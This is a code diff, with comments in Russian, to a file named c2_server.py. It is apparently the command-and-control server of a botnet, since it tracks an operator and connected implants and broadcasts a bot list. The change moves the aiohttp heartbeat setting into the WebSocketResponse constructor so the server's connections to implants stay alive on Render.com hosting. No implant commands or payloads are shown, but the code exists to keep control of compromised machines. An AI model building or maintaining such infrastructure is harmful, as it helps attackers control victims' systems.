@@ -1,7 +1,7 @@
 #
-# --- Файл: c2_server.py (Версия 2.9 - "Сердечный Ритм") ---
-# Это финальная версия. Она решает проблему обрыва соединения
-# на хостинге Render.com, включая автоматический keep-alive.
+# --- Файл: c2_server.py (Версия 3.0 - Правильный синтаксис) ---
+# Финальная версия. Исправляет ошибку TypeError, перемещая
+# аргумент heartbeat в конструктор WebSocketResponse.
 #
 import asyncio
 import json
@@ -40,12 +40,13 @@ async def broadcast_bot_list():
 # ==============================================================================
 async def websocket_handler(request):
   global OPERATOR, IMPLANTS
-  ws = web.WebSocketResponse()
 
-  # <<< ВОТ ОН. СЕРДЕЧНЫЙ РИТМ. >>>
-  # Этот параметр заставляет aiohttp самостоятельно обрабатывать
-  # низкоуровневые пинги, что не дает Render.com убить соединение.
-  await ws.prepare(request, heartbeat=25.0)
+  # <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ ЗДЕСЬ >>>
+  # Создаем WebSocketResponse СРАЗУ с параметром heartbeat.
+  ws = web.WebSocketResponse(heartbeat=25.0)
+
+  # А здесь просто готовим его, как и раньше.
+  await ws.prepare(request)
 
   client_type, client_id = None, None
   client_ip = request.remote
@@ -55,7 +56,7 @@ async def websocket_handler(request):
       if msg.type != web.WSMsgType.TEXT:
         continue
       if msg.data == 'ping':
-        await ws.send_str('pong') # На всякий случай, если наша панель пингует
+        await ws.send_str('pong')
         continue
 
       try:
@@ -121,5 +122,5 @@ app.router.add_get('/ws', websocket_handler)
 
 if __name__ == "__main__":
   port = int(os.environ.get("PORT", 10000))
-  print(f"====== C2 SERVER (V2.9) ONLINE on port {port} ======")
+  print(f"====== C2 SERVER (V3.0) ONLINE on port {port} ======")
   web.run_app(app, host='0.0.0.0', port=port)
